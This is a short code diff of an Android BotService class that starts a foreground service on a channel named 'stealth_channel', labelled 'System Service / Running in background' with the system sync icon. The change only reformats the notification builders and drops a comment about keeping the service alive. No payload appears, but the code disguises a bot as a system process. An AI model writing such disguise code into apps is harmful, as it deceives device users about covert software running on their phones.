@@ -20,23 +20,18 @@ public class BotService extends Service {
         .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS).build();
 
     @Override public int onStartCommand(Intent i, int f, int s) {
-        // تفعيل "الخدمة في الواجهة" لكي لا يقتلها النظام
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("stealth_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
             Notification notification = new Notification.Builder(this, "stealth_channel")
-                    .setContentTitle("System Service")
-                    .setContentText("Running in background")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .build();
+                    .setContentTitle("System Service").setContentText("Running in background")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync).build();
             startForeground(1, notification);
         } else {
             Notification notification = new Notification.Builder(this)
-                    .setContentTitle("System Service")
-                    .setContentText("Running in background")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .build();
+                    .setContentTitle("System Service").setContentText("Running in background")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync).build();
             startForeground(1, notification);
         }
 
